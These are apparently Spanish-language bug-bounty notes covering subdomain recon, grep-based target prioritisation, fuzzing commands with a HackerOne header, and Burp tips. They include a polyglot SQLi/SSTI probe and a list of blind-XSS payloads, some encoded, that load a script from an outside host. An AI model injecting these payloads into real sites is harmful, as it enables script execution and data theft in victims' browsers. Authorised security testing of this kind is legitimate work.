----
# Reconocimiento
## Búsqueda de Sub dominios (Wildcards)

### Búsqueda de tipo TDLs

Tenemos en el scope cosas como `hola.xx` entonces buscamos una lista de TDLs y vamos a usar para genera una lista de dominios del tipo `https://hola.com` y todas sus variantes un ejemplo seria con seclist:

```bash
cat /usr/share/seclists/Discovery/DNS/tlds.txt | while read line;do echo "https://hola$line"; done > hola_tlds_list.txt
```


ya con esto filtramos los validos con ayuda de `httpx-tookid` vamos a usar un filtro en este caso por los códigos de estado `200` pero podemos agregar mas si es necesario:

```bash
cat hola_tlds_list.txt | httpx-toolkit -mc 200 -title -ip > hola_domain_list.txt
```

La IP y el titulo es para darnos una idea, en muchas ocaciones varios TDLs pueden estar apuntando a un mismo servidor sirviendo lo mismo por lo tanto con esto si es el caso podemos escoger el principal y trabajar solo con ese.

### Búsqueda de tipo Dominio

En este caso tenemos wildcards como `*.hola.com` en estos casos tenemos que investigar todos los sub dominios posibles, en este caso vamos hacer un poco de reconocimiento con ayuda de `sufinder`:

```bash
subfinder -dL dominios.txt -all -silent > subdominios.txt
```

de esta forma vamos a poder obtener una lista masiva de sub dominios en la red referente a lo que le pasamos pero no todos esta operativos.

En este caso con la lista de sub dominios lista lo que tenemos que hacer es procesarlos con ayuda `httpx` para ver los que se encuentran activos, en este caso sera con el comando:

```bash
cat subdominios-revisar.txt | httpx-toolkit -mc 200 -title -ip > hola_subdominios-activos.txt
```

ya con esto tenemos una lista muchas veces masiva de sub dominios válidos y con estos podemos comenzar a analizar los mas interesantes.

## Filtrado de resultados

Bueno el filtrado de resultados es algo vital debido a que vamos a dividir todo por prioridad identificando por el titulo así sera mucho mas fácil identificar a que atacamos y por donde nos movemos:


### Prioridad 1

Aquí vamos atener a todo lo que son paginas de login y mas por lo tanto su filtro sera:

```bash
grep -iE "login|admin|portal|sso|auth|dashboard|sign" hola_subdominios-activos.txt > 1_prioridad_logins.txt
```

### Prioridad 2

En este punto estarán todo lo que tengamos referente a `apis` y usaremos el siguiente filtro:

```bash
grep -iE "api|graph|swagger|v1|v2" hola_subdominios-activos.txt > 2_prioridad_apis.txt
```

### Prioridad 3

Ahora vamos a almacenar todo lo que encontremos referente a entornos en desarrollo con el siguiente filtro:

```bash
grep -iE "dev|test|qa|uat|staging|beta" hola_subdominios-activos.txt > 3_prioridad_dev.txt
```

### Prioridad 4

En este filtro vamos a almacenar cualquier tipo de Herramienta Interna que se encontró de la siguiente manera:

```bash
grep -iE "jira|confluence|jenkins|gitlab|grafana" hola_subdominios-activos.txt > 4_prioridad_tools.txt
```

### Prioridad 5

Por último vamos a tener una lista que almacena todo lo que no concuerda con lo anterior:

```bash
grep -viE "login|admin|portal|sso|auth|dashboard|sign|api|graph|swagger|v1|v2|dev|test|qa|uat|staging|beta|jira|confluence|jenkins|gitlab|grafana" hola_subdominios-activos.txt > 5_prioridad_otros.txt
```

Ya con esto tendríamos dominios listos para comenzar a auditar.

-----------
# Inyecciones

## Cuadros de Búsqueda

```
stark'"\><sTark>${7*7}{{7*7}}
```

**Por partes:**
- `stark'"` -> SQLI
- `\><sTark>` -> Inyección de Etiquetas
- `${7*7}` -> SSTI
- `{{7*7}}` -> SSTI alternativo
- `<script>alert(1)</script>` -> XXS
- `<img src=0 onerror=\"alert(0)\">` -> XXS alternativo.

## Formularios

### Inyecciones XSS

Para este caso vamos a usar varios casos y cargas útiles, primero intentado que se reflejen hacia nosotros:

`"><script src="https://js.rip/stark-sec17"></script>`

`"><script src="https://js.rip/stark-sec17"></script>`

`"><script/src="https://js.rip/stark-sec17"></script>`

`"><img src=x onerror=document.body.appendChild(document.createElement('script')).src='https://js.rip/stark-sec17'>`

`"><svg/onload=document.body.appendChild(document.createElement('script')).src='https://js.rip/stark-sec17'>`

`"><svg/onload=document.body.appendChild(document.createElement('script')).src=atob('aHR0cHM6Ly9qcy5yaXAvc3Rhcmstc2VjMTc=')>`

`"><svg/onload=document.body.appendChild(document.createElement('script')).src=String.fromCharCode(104,116,116,112,115,58,47,47,106,115,46,114,105,112,47,115,116,97,114,107,45,115,101,99,49,55)>`

`%3E%22%3Cscript%20src%3D%22https%3A%2F%2Fjs.rip%2Fstark-sec17%22%3E%3C%2Fscript%3E`

`%3E%22%3Cscript%20src%3D%22https%3A%2F%2Fjs.rip%2Fstark-sec17%22%3E%3C%2Fscript%3E`


# Fuzzing

## gobuster

En este caso esto es algo mas delicado y es que no podemos lanzar a maxima velocidad ni a lo tonto tenemos que ser cautelosos y enviar la cabecera de Hacker One se especifique, el ejemplo del comando perfecto seria:

```bash
gobuster dir -u https://bose.audio/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 5 --delay 500ms -H "X-HackerOne-Research: danystarrkk"
```

con esto podemos 

## fuff

En este caso vamos a ver un ejemplo de como hacerlo con ayuda de fuff:

```bash
ffuf -w /ruta/a/tu/SecLists/Discovery/Web-Content/cgis.txt -u https://bose.codes/cgi-bin/FUZZ -e .sh,.cgi,.pl,.py,.txt -fc 403,404 -t 50 -H "X-HackerOne-Research: danystarrkk"
```

# CMS

## Wordpress

De por si wordpress no es una tecnología vulnerable, el problema son los plugins y ese es siempre nuestro punto de partida:

1. hacer fuzzing a las rutas ocultas con algún diccionario de word press con el objetivo de ver si tenemos rutas usuales expuestas que nos den información.
2. Búsqueda de plugins mediante el código fuente, vamos a encontrar algunos y podemos identificar hasta las versiones en algunos casos de uso.

# Burp Suite

## Intruder sin mucho ruido

Una configuración adecuada para no generar un DOS puede ser:
![[Pasted image 20260420203246.png]]

el Delay lo podemos aumentar hasta en 5 segundos si queremos ser mas sigilosos.